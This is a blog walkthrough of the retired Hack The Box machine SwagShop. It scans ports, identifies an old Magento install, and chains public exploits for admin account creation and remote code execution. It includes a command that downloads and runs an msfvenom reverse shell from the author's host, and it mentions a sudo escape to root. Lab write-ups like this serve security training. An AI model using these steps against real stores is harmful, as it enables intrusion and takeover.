---
layout: post
title: "SwagShop: Hack The Box Walkthrough"
date: 2019-09-28 19:03:53 +0000
last_modified_at: 2019-09-28 19:03:53 +0000
category: Walkthrough
tags: ["Hack The Box", SwagShop, retired]
comments: true
image:
  feature: swagshop-htb-walkthrough.jpg
  credit: Life-Of-Pix / Pixabay
  creditlink: https://pixabay.com/photos/pigeon-bird-walking-street-road-569128/
---

This post documents the complete walkthrough of SwagShop, a retired vulnerable [VM][1] created by [ch4p][2], and hosted at [Hack The Box][3]. If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

## On this post 
{:.no_toc} 

* TOC 
{:toc}

## Background

SwagShop is a retired vulnerable VM from Hack The Box.

## Information Gathering

Let’s start with a `masscan` probe to establish the open ports in the host.

```
# masscan -e tun0 -p1-65535,U:1-65535 10.10.10.140 --rate=700

Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-05-14 01:30:31 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 22/tcp on 10.10.10.140                                    
Discovered open port 80/tcp on 10.10.10.140
```

Nothing unusual. Let's do one better with `nmap` scanning the discovered ports to establish the services.

```
# nmap -n -v -Pn -p22,80 -A --reason -oN nmap.txt 10.10.10.140
...
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 b6:55:2b:d2:4e:8f:a3:81:72:61:37:9a:12:f6:24:ec (RSA)
|   256 2e:30:00:7a:92:f0:89:30:59:c1:77:56:ad:51:c0:ba (ECDSA)
|_  256 4c:50:d5:f2:70:c5:fd:c4:b2:f0:bc:42:20:32:64:34 (ED25519)
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: 88733EE53676A47FC354A61C32516E82
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Error 503: Service Unavailable
```

The `http` service appears to be running an old version of Magento Community Edition (2014? Hello, it's 2019!). Sometimes it pays to look at the copyright notice down at the footer. Here's how it looks like.

<a class="image-popup">
![d34cc2c8.png](/assets/images/posts/swagshop-htb-walkthrough/d34cc2c8.png)
</a>

Scroll down.

### Magento Community Edition 1.7.0.2

How do I know the version? Check out the release notes basically. The directory structure is also found in a GitHub repository [mirror](https://github.com/OpenMage/magento-mirror/tree/1.7.0.2) for older versions.

<a class="image-popup">
![a09563a1.png](/assets/images/posts/swagshop-htb-walkthrough/a09563a1.png)
</a>

### Magento Shoplift Vulnerability

This particular version is susceptible to the Magento Shoplift vulnerability [discovered](https://blog.checkpoint.com/2015/04/20/analyzing-magento-vulnerability/) by Checkpoint in 2015.

Well, there's a readily available exploit, EDB-ID [37977](https://www.exploit-db.com/exploits/37977) for it. Running this exploit will grant access to the Admin Panel with credentials (`forme:forme`).

### Magento CE < 1.9.0.1 - (Authenticated) Remote Code Execution

This next exploit, EDB-ID [37811](https://www.exploit-db.com/exploits/37811) will allow us to execute remote commands. There are just two minor modifications to the exploit script.

<a class="image-popup">
![701cf120.png](/assets/images/posts/swagshop-htb-walkthrough/701cf120.png)
</a>

We got the credentials from the previous exploit. The installation date can be obtained from `http://10.10.10.140/app/etc/local.xml` as suggested.

<a class="image-popup">
![4bfdeefa.png](/assets/images/posts/swagshop-htb-walkthrough/4bfdeefa.png)
</a>

One last thing we need to know is the URL to the Admin Panel, which is `http://10.10.10.140/index.php/admin`. You can get a feel of the directory structure by navigating the site a bit, provided it doesn't give you `503`s :laugh:

## Low-Privilege Shell

I generate a reverse shell with `msfvenom`, host it with Python's SimpleHTTPServer, and also set up a `nc` listener. We then execute the exploit like so.

```
# python rce.py http://10.10.10.140/index.php/admin "wget -O/tmp/rev http://10.10.14.11/rev; chmod +x /tmp/rev; /tmp/rev"
```

<a class="image-popup">
![2654aa89.png](/assets/images/posts/swagshop-htb-walkthrough/2654aa89.png)
</a>

It's customary to display `/etc/passwd`.

<a class="image-popup">
![a7d45ff6.png](/assets/images/posts/swagshop-htb-walkthrough/a7d45ff6.png)
</a>

The file `user.txt` is in `haris`'s home directory and it can be disappointingly read by all.

<a class="image-popup">
![b11e7841.png](/assets/images/posts/swagshop-htb-walkthrough/b11e7841.png)
</a>

## Privilege Escalation

Notice the `.sudo_as_admin_successful`?

<a class="image-popup">
![1859737a.png](/assets/images/posts/swagshop-htb-walkthrough/1859737a.png)
</a>

This means that `haris` is able to `sudo` to a certain extent.

<a class="image-popup">
![4aaf3f8b.png](/assets/images/posts/swagshop-htb-walkthrough/4aaf3f8b.png)
</a>

There you go, classic escape to `root` shell.

<a class="image-popup">
![6d2c05ad.png](/assets/images/posts/swagshop-htb-walkthrough/6d2c05ad.png)
</a>

With that, getting `root.txt` is a breeze.

<a class="image-popup">
![87726194.png](/assets/images/posts/swagshop-htb-walkthrough/87726194.png)
</a>

:dancer:

## Afterthought

What a neat idea to promote the SwagShop!

[1]: https://www.hackthebox.eu/home/machines/profile/188
[2]: https://www.hackthebox.eu/home/users/profile/1
[3]: https://www.hackthebox.eu/
